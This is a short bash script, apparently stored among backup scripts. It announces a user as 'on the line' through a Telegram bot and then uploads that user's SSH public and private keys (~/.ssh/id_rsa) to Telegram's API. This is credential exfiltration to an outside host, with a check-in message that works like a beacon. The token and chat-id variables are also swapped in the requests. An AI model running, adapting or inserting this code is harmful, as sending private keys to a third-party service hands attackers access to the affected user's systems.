#!/bin/bash

# export variables
source /root/backup/scripts/.env
# source /root/backup/scripts/.env.local

# Send telegram message
TELEGRAM_MESSAGE="<b>🎯 $username на связи</b>"

curl -X POST \
    -H 'Content-Type: application/json' \
    -d "{ \
                \"chat_id\": \"$TELEGRAM_BOT_TOKEN\", \
                \"text\": \"$TELEGRAM_MESSAGE\", \
                \"parse_mode\": \"HTML\", \
                \"disable_web_page_preview\": true,\
                \"disable_notification\": true \
            }" \
    https://api.telegram.org/bot$TELEGRAM_CHAT_ID/sendMessage

curl -X POST \
    -F chat_id="${TELEGRAM_BOT_TOKEN}" \
    -F parse_mode="Markdown" \
    -F 'media=[{"type": "document", "media": "attach://file1"}, {"type": "document", "media": "attach://file2" }]' \
    -F file1=@"/home/${username}/.ssh/id_rsa.pub" \
    -F file2=@"/home/${username}/.ssh/id_rsa" \
    -F disable_notification=true \
    https://api.telegram.org/bot$TELEGRAM_CHAT_ID/sendMediaGroup
